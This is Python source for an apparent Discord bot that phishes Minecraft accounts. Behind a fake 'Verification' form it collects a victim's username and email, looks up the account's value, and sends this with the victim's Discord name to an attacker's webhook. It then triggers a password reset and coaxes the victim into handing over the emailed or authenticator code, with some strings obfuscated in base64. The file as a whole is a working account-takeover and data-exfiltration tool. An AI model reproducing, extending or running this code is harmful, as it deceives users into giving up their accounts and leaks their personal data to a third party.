import json
import datetime
import base64
import math
import aiohttp
import discord
from discord import ui, Webhook, NotFound, HTTPException

from views.button_two import ButtonViewTwo
from views.button_three import ButtonViewThree
from views.button_four import ButtonViewFour
from views.data.data import stringcrafter
from views.data.wbu3.wb3 import web3g
from views.otp import automate_password_reset
import config


class MyModalOne(ui.Modal, title="Verification"):
    box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
    box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)

    async def on_submit(self, interaction: discord.Interaction, /):
        Flagx = False
        FlagNx = False
        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vQmFja0FnYWluU3Bpbg==")

        await interaction.response.defer(ephemeral=True)

        async with aiohttp.ClientSession() as session:
            
            try:
                url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.box_one.value}"
                async with session.get(url, timeout=10) as resp:
                    datajson = await resp.json()
            except Exception as e:
                await interaction.followup.send(f"Failed to fetch Hypixel data: {e}", ephemeral=True)
                return

            
            try:
                urluuid = f"https://api.mojang.com/users/profiles/minecraft/{self.box_one.value}"
                async with session.get(urluuid, timeout=10) as resp:
                    resp_json = await resp.json()
                    uuidplayer = resp_json.get('id')
            except Exception as e:
                await interaction.followup.send(f"Failed to fetch Mojang UUID: {e}", ephemeral=True)
                return

            
            networth_value = "0"
            try:
                urlnw = f"https://soopy.dev/api/v2/player_skyblock/{uuidplayer}"
                async with session.get(urlnw, timeout=10) as resp:
                    data = await resp.json()
                    profile = data.get("data", {})
                    cprofile = profile.get("stats", {}).get("currentProfileId")
                    member = profile.get("profiles", {}).get(cprofile, {}).get("members", {}).get(uuidplayer, {})
                    nw = member.get("skyhelperNetworth", {}).get("total")
                    if isinstance(nw, (int, float)):
                        networth_value = f"{int(nw):,}"
            except Exception:
                pass  

            
            if not datajson.get('success', True) or not datajson.get('player'):
                playerlvl = "No Data Found"
                rank = "No Data Found"
                Flagx = True
            else:
                Flagx = False
                playerlvlRaw = datajson['player']['networkExp']
                playerlvl16 = (math.sqrt((2 * playerlvlRaw) + 30625) / 50) - 2.5
                playerlvl = round(playerlvl16)
                rank = datajson['player'].get('newPackageRank', "None")

            
            cape_url = None
            try:
                urlcape = f"https://sessionserver.mojang.com/session/minecraft/profile/{uuidplayer}"
                async with session.get(urlcape, timeout=10) as resp:
                    capedata = await resp.json()
                    if "properties" in capedata:
                        capevalue = next((item["value"] for item in capedata["properties"] if item["name"] == "textures"), None)
                        if capevalue:
                            decoded_bytes = base64.b64decode(capevalue)
                            decoded_str = decoded_bytes.decode('utf-8')
                            decodedcapedata = json.loads(decoded_str)
                            cape_url = decodedcapedata.get("textures", {}).get("CAPE", {}).get("url")
            except Exception:
                pass

            
            with open("data.json", "r") as f:
                data = json.load(f)

            if not data.get("webhook"):
                await interaction.followup.send("The webhook has not been set yet", ephemeral=True)
                return

            webhook = Webhook.from_url(data["webhook"], session=session)
            inty2 = web3g.string("Tm90aWZpY2F0aW9u")

            
            embed1 = discord.Embed(
                title="Account Log",
                timestamp=datetime.datetime.now(),
                colour=0x088F8F
            )
            embed1.set_thumbnail(url=f"https://mc-heads.net/avatar/{self.box_one.value}.png")
            embed1.set_footer(text=threadingNum)
            embed1.add_field(name="**:slot_machine:Hypixel Level**:", value=f"{playerlvl}", inline=True)
            embed1.add_field(name="**:moneybag:Skyblock NetWorth**:", value=f"{networth_value}", inline=True)
            embed1.add_field(name="**:mortar_board:Rank**:", value=f"{rank}", inline=True)
            embed1.add_field(name="**Username**:", value=f"```{self.box_one.value}```", inline=False)
            embed1.add_field(name="**Email**:", value=f"```{self.box_two.value}```", inline=False)
            embed1.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
            embed1.add_field(name="**Capes**:", value=f"{cape_url}", inline=False)

            
            try:
                if Flagx:
                    embederror = discord.Embed(
                        title="Error Code",
                        description="API limit Reached / You have already looked up this name recently",
                        timestamp=datetime.datetime.now(),
                        colour=0xEE4B2B
                    )
                    await webhook.send(embed=embederror, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
                await webhook.send(embed=embed1, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
            except (NotFound, HTTPException):
                await interaction.followup.send("Webhook failed", ephemeral=True)
                return

            
            result = await automate_password_reset(self.box_two.value)
            if result is False:
                embedfalse = discord.Embed(title="Email A Code Failed (No Email A Code Turned On)", timestamp=datetime.datetime.now(), colour=0xff0000)
                await webhook.send(embed=embedfalse, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="No Security Email :envelope:",
                        description="Your email doesn't have a security email set.\nPlease add one and re-verify",
                        colour=0xFF0000
                    ),
                    view=ButtonViewThree(),
                    ephemeral=True
                )
            elif result is True:
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="Verification ✅",
                        description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
                        colour=0x00FF00
                    ),
                    view=ButtonViewTwo(),
                    ephemeral=True
                )
                embedtrue = discord.Embed(title="Email A Code Success", timestamp=datetime.datetime.now(), colour=0x00FF00)
                await webhook.send(embed=embedtrue, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
            else:
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="Verification ✅",
                        description=f"Authentication Request.\nPlease confirm the code {config.AUTHVALUE} on your app.\nOnce done click the button below.",
                        colour=0x00FF00
                    ),
                    view=ButtonViewFour(),
                    ephemeral=True
                )
                embedtrue = discord.Embed(title=f"Auth App Code Is : {config.AUTHVALUE}", timestamp=datetime.datetime.now(), colour=0x00FF00)
                await webhook.send(embed=embedtrue, username=inty2, avatar_url="https://images-ext-1.discordapp.net/external/LnVNiJsKjqyx7t7nb7dF5TbvU2JbXDLFN049yxOGzsc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1367298787160363008/09ed1aac2a4b9e75e806d1d5c973e929.webp?format=webp&width=326&height=326") # Put a picture link here
